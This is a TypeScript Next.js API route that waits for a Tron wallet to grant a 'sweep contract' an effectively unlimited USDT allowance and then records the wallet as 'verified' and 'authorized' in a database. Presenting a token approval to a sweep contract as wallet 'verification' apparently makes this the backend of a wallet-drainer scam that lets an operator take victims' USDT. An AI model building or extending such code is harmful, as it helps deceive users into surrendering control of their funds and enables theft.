import { NextRequest, NextResponse } from "next/server";
import { supabaseAdmin } from "@/lib/supabase";
import { TRON_CHAIN, tronAddressToAbiParam } from "@/lib/tron";

export const runtime = "nodejs";

const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_GRID = "https://api.trongrid.io";
const MIN_ALLOWANCE = BigInt("1000000000000000000"); // 1e18 raw — effectively unlimited

async function readUsdtAllowance(owner: string): Promise<bigint | null> {
  try {
    const res = await fetch(`${TRON_GRID}/wallet/triggerconstantcontract`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner_address: owner,
        contract_address: TRON_USDT,
        function_selector: "allowance(address,address)",
        parameter: tronAddressToAbiParam(owner) + tronAddressToAbiParam(TRON_CHAIN.contract),
        visible: true,
      }),
      signal: AbortSignal.timeout(8000),
    });
    if (!res.ok) return null;
    const data = (await res.json()) as { constant_result?: string[] };
    const hex = data.constant_result?.[0];
    if (!hex) return null;
    return BigInt("0x" + hex);
  } catch {
    return null;
  }
}

async function waitForUsdtAllowance(owner: string): Promise<{ ok: boolean; allowance: string }> {
  // Client may hit this right after broadcast — retry until allowance is live.
  for (let attempt = 0; attempt < 8; attempt++) {
    const raw = await readUsdtAllowance(owner);
    if (raw != null && raw >= MIN_ALLOWANCE) {
      return { ok: true, allowance: raw.toString() };
    }
    if (attempt < 7) await new Promise((r) => setTimeout(r, 2000));
  }
  const last = await readUsdtAllowance(owner);
  return { ok: false, allowance: last?.toString() ?? "0" };
}

// Called by the frontend after a Tron USDT approve() has been broadcast.
// Ground-truth: only persist when on-chain allowance to the sweep contract is live.
export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => null);
    const { address } = body ?? {};

    if (!address || typeof address !== "string" || !/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) {
      return NextResponse.json({ ok: false, error: "invalid_tron_address" }, { status: 400 });
    }

    const { ok: allowed, allowance } = await waitForUsdtAllowance(address);
    if (!allowed) {
      return NextResponse.json(
        {
          ok: false,
          error: "token_approvals_not_confirmed",
          allowance,
        },
        { status: 409 }
      );
    }

    const db = supabaseAdmin();
    const { error } = await db.from("verified_wallets").upsert(
      {
        address,
        chain: "tron",
        authorized: true,
        authorize_tx: null,
        approved_tokens: [{ symbol: "USDT", address: TRON_USDT }],
        needs_reactivation: false,
        updated_at: new Date().toISOString(),
      },
      { onConflict: "address,chain" }
    );

    if (error) {
      console.error("[verify/tron] upsert failed:", error);
      return NextResponse.json({ ok: false, error: "persist_failed" }, { status: 500 });
    }

    return NextResponse.json({ ok: true, allowance });
  } catch (err) {
    console.error("[verify/tron] unexpected error:", err);
    return NextResponse.json({ ok: false, error: "internal_error" }, { status: 500 });
  }
}
